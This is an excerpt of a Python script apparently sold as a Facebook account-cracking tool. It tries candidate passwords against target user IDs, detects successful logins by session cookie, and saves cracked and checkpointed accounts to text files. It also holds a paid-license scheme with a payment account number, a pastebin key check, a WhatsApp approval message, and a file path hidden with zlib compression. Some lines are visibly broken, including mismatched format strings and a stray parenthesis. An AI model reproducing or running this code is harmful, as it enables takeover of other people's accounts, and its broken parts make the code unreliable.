...
logo =                                          """   
   ...
   \033[1;37m 【A】【S】【A】【D】
\x1b[1;97m------------------------\x1b[1;97m------------------------
\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37m           ASAD JAVED
\033[1;31m\033[1;37m Facebook\x1b[1;97m:  \033[1;37m          ASAD ANSAARI
\033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37m           ASAD _V.M.K
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mASAD_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mASAD_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back ASAD Menu ")
	    asad()
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[ASAD] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        print('\r%s [ASAD-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
...
def bnsbuy():
    ...
    try:
        ...
        r = requests.get("https://pastebin.com/raw/4dCFMUaB").text)
    ...
    if to in r:
        ...
        print
        print('\rEasyPaisa Account Number 03214598890\n')
        print('\rAccount Name Muhammad Munsha\n')
        print
        print
...
def bnsreg():
    ...
    print
    print('\rTool Price 500rs\n')
    print
    print('\rEadyPaisa Account Number 03214598890\n')
    print('\rAccount Name Muhammad Munsha\n')
    print
    print('\rPayment Successfully Msg Or Token Send\n')
    print
    ...
    tks = 'Hello%20Admin%20Approval%20my%20key.%20payment%20Done,%20%20Information%20:-%20%20%20Track%20Msg%20:%20%20'+sb+'%20Token%20:%20'+ss
    os.system('am start https://wa.me/+923214598890?text=' + tks)
    f = (b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfa\xa9%\xc9\xfa\x10\xc1\xa4\xcc<\x00}\x1e\x11\x17')
    bd = (zlib.decompress(f))
    sav = open(bd, 'w') 
    sav.write(id)
